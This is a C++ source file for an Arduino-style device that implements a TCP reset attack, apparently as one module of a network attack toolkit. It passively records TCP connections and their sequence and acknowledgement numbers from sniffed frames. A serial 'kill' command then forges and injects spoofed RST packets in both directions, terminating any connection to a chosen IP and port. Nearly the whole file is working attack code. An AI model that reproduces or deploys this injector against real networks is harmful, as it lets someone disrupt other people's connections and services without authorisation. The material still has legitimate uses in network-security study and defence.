// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 0x4133

#include "attack_tcp_rst.h"

#include <string.h>

#include <Arduino.h>

#include "arp_table.h"
#include "config.h"
#include "eth_frame.h"
#include "inject.h"
#include "ip_util.h"
#include "state.h"

TcpConn tcpConnTable[TCP_CONN_TABLE_SIZE];

void tcpTrackPacket(const uint8_t* pkt, uint16_t len) {
  if (len < ETH_HEADER_LEN + 40)
    return;
  uint16_t etype = pktRead16(pkt + ETH_TYPE);
  if (etype != ETHERTYPE_IPV4)
    return;

  const uint8_t* ipHdr = pkt + ETH_HEADER_LEN;
  if (ipHdr[9] != IP_PROTO_TCP)
    return;

  uint8_t ipHdrLen = (ipHdr[0] & 0x0F) * 4;
  const uint8_t* tcpHdr = ipHdr + ipHdrLen;
  const uint8_t* srcIP = ipHdr + 12;
  const uint8_t* dstIP = ipHdr + 16;
  uint16_t srcPort = pktRead16(tcpHdr);
  uint16_t dstPort = pktRead16(tcpHdr + 2);
  uint32_t seqNum = pktRead32(tcpHdr + 4);
  uint32_t ackNum = pktRead32(tcpHdr + 8);
  uint8_t flags = tcpHdr[13];

  // Skip RST/FIN — connection is ending
  if (flags & 0x04)
    return;

  // Find or create entry
  int slot = -1;
  int freeSlot = -1;
  int oldestSlot = 0;
  uint32_t oldestTime = UINT32_MAX;

  for (int i = 0; i < TCP_CONN_TABLE_SIZE; i++) {
    if (!tcpConnTable[i].active) {
      if (freeSlot < 0)
        freeSlot = i;
      continue;
    }
    // Match bidirectional
    if ((memcmp(tcpConnTable[i].srcIP, srcIP, 4) == 0 &&
         memcmp(tcpConnTable[i].dstIP, dstIP, 4) == 0 && tcpConnTable[i].srcPort == srcPort &&
         tcpConnTable[i].dstPort == dstPort) ||
        (memcmp(tcpConnTable[i].srcIP, dstIP, 4) == 0 &&
         memcmp(tcpConnTable[i].dstIP, srcIP, 4) == 0 && tcpConnTable[i].srcPort == dstPort &&
         tcpConnTable[i].dstPort == srcPort)) {
      slot = i;
      break;
    }
    // Expire old (>60s)
    if (millis() - tcpConnTable[i].lastSeen > 60000) {
      tcpConnTable[i].active = false;
      if (freeSlot < 0)
        freeSlot = i;
      continue;
    }
    if (tcpConnTable[i].lastSeen < oldestTime) {
      oldestTime = tcpConnTable[i].lastSeen;
      oldestSlot = i;
    }
  }

  if (slot < 0)
    slot = (freeSlot >= 0) ? freeSlot : oldestSlot;

  TcpConn& c = tcpConnTable[slot];
  c.active = true;
  memcpy(c.srcIP, srcIP, 4);
  memcpy(c.dstIP, dstIP, 4);
  c.srcPort = srcPort;
  c.dstPort = dstPort;
  c.lastSeq = seqNum;
  c.lastAck = ackNum;
  c.lastSeen = millis();
}

void killConnection(const uint8_t* targetIP, uint16_t port) {
  int killed = 0;
  for (int i = 0; i < TCP_CONN_TABLE_SIZE; i++) {
    if (!tcpConnTable[i].active)
      continue;
    TcpConn& c = tcpConnTable[i];

    bool match = false;
    if (port == 0) {
      match = (memcmp(c.srcIP, targetIP, 4) == 0 || memcmp(c.dstIP, targetIP, 4) == 0);
    } else {
      match = ((memcmp(c.srcIP, targetIP, 4) == 0 && c.srcPort == port) ||
               (memcmp(c.dstIP, targetIP, 4) == 0 && c.dstPort == port) ||
               (memcmp(c.srcIP, targetIP, 4) == 0 && c.dstPort == port) ||
               (memcmp(c.dstIP, targetIP, 4) == 0 && c.srcPort == port));
    }

    if (!match)
      continue;

    // Resolve MACs for both sides
    uint8_t macA[6], macB[6];
    bool gotA = resolveMacForIP(c.srcIP, macA);
    bool gotB = resolveMacForIP(c.dstIP, macB);

    for (int r = 0; r < KILL_RST_COUNT; r++) {
      // RST from A's perspective
      if (gotA) {
        uint16_t f = buildTcpRst(txBuf, macA, c.dstIP, c.srcIP, c.dstPort, c.srcPort,
                                 c.lastAck + r);
        sendRawFrame(txBuf, f);
      }
      // RST from B's perspective
      if (gotB) {
        uint16_t f = buildTcpRst(txBuf, macB, c.srcIP, c.dstIP, c.srcPort, c.dstPort,
                                 c.lastSeq + r);
        sendRawFrame(txBuf, f);
      }
    }

    Serial.printf("[KILL] RST sent: %u.%u.%u.%u:%u <-> %u.%u.%u.%u:%u\n", c.srcIP[0], c.srcIP[1],
                  c.srcIP[2], c.srcIP[3], c.srcPort, c.dstIP[0], c.dstIP[1], c.dstIP[2], c.dstIP[3],
                  c.dstPort);

    c.active = false;
    killed++;
  }

  if (killed == 0)
    Serial.println("[KILL] No matching connections found");
  else
    Serial.printf("[KILL] %d connection(s) killed\n", killed);
}

void parseKillCommand(const char* cmd) {
  while (*cmd == ' ')
    cmd++;

  if (strncmp(cmd, "list", 4) == 0) {
    Serial.println("[KILL] Active TCP connections:");
    int count = 0;
    for (int i = 0; i < TCP_CONN_TABLE_SIZE; i++) {
      if (!tcpConnTable[i].active)
        continue;
      TcpConn& c = tcpConnTable[i];
      Serial.printf("  %u.%u.%u.%u:%u <-> %u.%u.%u.%u:%u (%us ago)\n", c.srcIP[0], c.srcIP[1],
                    c.srcIP[2], c.srcIP[3], c.srcPort, c.dstIP[0], c.dstIP[1], c.dstIP[2],
                    c.dstIP[3], c.dstPort, (millis() - c.lastSeen) / 1000);
      count++;
    }
    if (count == 0)
      Serial.println("  (none tracked)");
    return;
  }

  // Parse IP[:port]
  uint8_t targetIP[4];
  uint16_t port = 0;
  char ipStr[20];

  const char* colon = strchr(cmd, ':');
  int ipLen = colon ? (colon - cmd) : strlen(cmd);
  if (ipLen <= 0 || ipLen >= (int)sizeof(ipStr)) {
    Serial.println("[KILL] Usage: kill X.X.X.X[:port] or kill list");
    return;
  }
  memcpy(ipStr, cmd, ipLen);
  ipStr[ipLen] = '\0';

  if (!parseIP(ipStr, targetIP)) {
    Serial.println("[KILL] Invalid IP");
    return;
  }
  if (colon)
    port = atoi(colon + 1);

  killConnection(targetIP, port);
}
